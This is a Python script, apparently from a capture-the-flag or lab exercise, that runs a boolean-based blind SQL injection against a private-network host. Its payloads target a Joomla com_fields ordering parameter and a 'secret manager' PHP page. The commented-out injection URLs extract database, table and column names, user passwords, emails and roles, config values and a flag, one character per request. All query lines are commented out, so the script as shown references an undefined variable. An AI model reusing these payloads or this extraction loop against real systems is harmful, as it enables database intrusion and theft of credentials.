import os
import requests





for i in range(100):
    print("")




print("running...")

target = "http://10.102.181.239/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)"

condition = "1573=1573"

#target = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR '1'='1"

test = "Config correctly set"
#test = "The most recent request was denied because it contained an invalid security token. Please refresh the page and try again."

chars = " -_abcdefghijklmnopqrstuvwxyz0123456789}{)($£!@./\\*][~';:,><`¬%\"\n"
#chars = "0123456789"

def check(st):
    r = requests.get(st)
    #print(len(r.text))
    if test in r.text:
        return True
    else:
        return False


tmp = ""


counter = -1000


answers = []
for j in range(0, 200):
    
    tmp = "{}: ".format(j)
    tmpp = ""
    notFound = False
    for i in range(1,40):
        letterFound = False

        #for char in range(0, 256):
        for char in chars:
            

            # SELECT name FROM sys.databases;
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM sys.databases() LIMIT {},1),{},1)='{}".format(j, i, char)   

            # GET DB NAME
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING(DATABASE(),{},1)='{}".format(i, char)     

            #query = target.replace(condition, "SUBSTRING(DATABASE(),{},1)='{}'".format(i, char))

            
            # GET TABLE NAMES
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}".format(j, i, char) 

            # GET COLUMN NAME
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)   


                

            # GET VALUE
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)     
            # GET VALUE
            # query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)        
            # GET VALUE
            # query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM users LIMIT {},1),{},1)='{}".format(j, i, char)         

            
            
            # GET VALUE
            # query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM config LIMIT {},1),{},1)='{}".format(j, i, char)        
            # GET VALUE
            # query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT value FROM config LIMIT {},1),{},1)='{}".format(j, i, char)       





            # get quick answer if table exists
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR IF(EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = 'flag_table'),'OK','NO')='OK"






            # TRYING TO GET THE FLAG
            
            # GET VALUE


            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table

            
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
            
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT flag FROM flag_table LIMIT {},1),{},1)=CHAR({}) OR '".format(j, i, char) 




            #get files details
            # 
            #       
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
            
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='files' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
            
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT file_name FROM files LIMIT {},1),{},1)='{}' OR '".format(j, i, char) 





#            query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
#            query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT table_rows FROM information_schema.tables LIMIT {},1),{},1)='{}' OR '".format(j, i, char)  # flag_table
#
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='flag_table' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag
#
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((COUNT(SELECT user FROM db LIMIT {},1),{},1))='{}".format(j, i, char)  
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((COUNT(SELECT flag FROM flag_table LIMIT {},1),{},1))='{}".format(j, i, char)  
#
#            query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
#            query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag

            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT email FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT password FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT name FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT role FROM users LIMIT {},1),{},1)='{}".format(j, i, char)  
            #query = "http://10.102.181.239/s3cret_manag3r_pag3.php?name=' OR SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='tables_priv' LIMIT {},1),{},1)='{}' OR '".format(j, i, char)    # flag


            #print(query)
            if check(query):
                #print(char)
                #tmp += chr(char)
                tmp += str(char)
                print(tmp)
                #tmpp += chr(char)
                #print('"' + tmp + '"')    
                letterFound = True
            counter += 1
        

            




    print(tmp)
    answers.append(tmp)























#for answer in answers:
#    print(answer)
    

